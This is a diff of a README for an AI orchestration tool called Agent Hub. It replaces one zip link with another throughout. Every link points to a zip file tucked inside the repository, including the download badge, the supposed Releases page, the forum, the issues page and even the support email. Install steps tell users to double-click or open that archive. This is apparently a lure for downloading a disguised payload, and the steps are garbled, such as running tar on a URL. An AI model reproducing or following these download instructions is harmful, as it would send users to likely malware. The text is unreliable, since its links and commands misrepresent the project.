@@ -6,9 +6,9 @@ Agent Hub is an enterprise-grade AI orchestration platform that transforms how d
 
 ## 📥 Download Now
 
-[![Download agent-hub](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
+[![Download agent-hub](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip)](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip)
 
-Visit this page to download the latest version: [agent-hub Releases](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
+Visit this page to download the latest version: [agent-hub Releases](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these steps to install Agent Hub on your computer.
 
 ### Step 1: Visit the Releases Page
 
-Click this link to go to the Releases page: [agent-hub Releases](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip). Here, you will find different versions of the software.
+Click this link to go to the Releases page: [agent-hub Releases](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip). Here, you will find different versions of the software.
 
 ### Step 2: Choose the Correct Version
 
@@ -26,22 +26,22 @@ On the Releases page, look for the latest version. Make sure to check the versio
 
 Find the asset that corresponds to your operating system. Click on it to begin the download. The files may include:
 
-- **Windows:** https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
-- **macOS:** https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
-- **Linux:** https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
+- **Windows:** https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip
+- **macOS:** https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip
+- **Linux:** https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip
 
 ### Step 4: Install Agent Hub
 
 Once the download is complete, locate the downloaded file on your computer. 
 
-- For **Windows**: Double-click the `https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip` and follow the on-screen instructions to complete the installation.
+- For **Windows**: Double-click the `https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip` and follow the on-screen instructions to complete the installation.
   
-- For **macOS**: Open the `https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip`, drag the Agent Hub icon to your Applications folder, and then open it from there.
+- For **macOS**: Open the `https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip`, drag the Agent Hub icon to your Applications folder, and then open it from there.
 
-- For **Linux**: Extract the `https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip` file into a directory of your choice using the command:
+- For **Linux**: Extract the `https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip` file into a directory of your choice using the command:
   
   ```bash
-  tar -xzvf https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
+  tar -xzvf https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip
   ```
   Then, run the installation script.
 
@@ -80,9 +80,9 @@ For more details on how to use Agent Hub, you can check the documentation availa
 
 If you encounter issues or have questions:
 
-- Join our [community forum](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip) to discuss with other users.
-- Check the [issues page](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip) on GitHub for known issues and solutions.
-- If you need direct help, reach out via our support email: https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
+- Join our [community forum](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip) to discuss with other users.
+- Check the [issues page](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip) on GitHub for known issues and solutions.
+- If you need direct help, reach out via our support email: https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip
 
 ## 📊 Topics
 
@@ -102,11 +102,11 @@ Explore these topics to find more resources and information about how Agent Hub 
 
 For further resources, check:
 
-- [GitHub Repository](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
-- [Further Readings](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
+- [GitHub Repository](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip)
+- [Further Readings](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip)
 
 ## 📥 Download Again
 
-Don’t forget, you can always download the latest version of Agent Hub from the Releases page: [agent-hub Releases](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip). 
+Don’t forget, you can always download the latest version of Agent Hub from the Releases page: [agent-hub Releases](https://github.com/ggyounoobf/agent-hub/raw/refs/heads/main/mcp-tools-server/tools/web_scraper/services/hub-agent-2.0.zip). 
 
 Enjoy using Agent Hub and transforming your development processes!
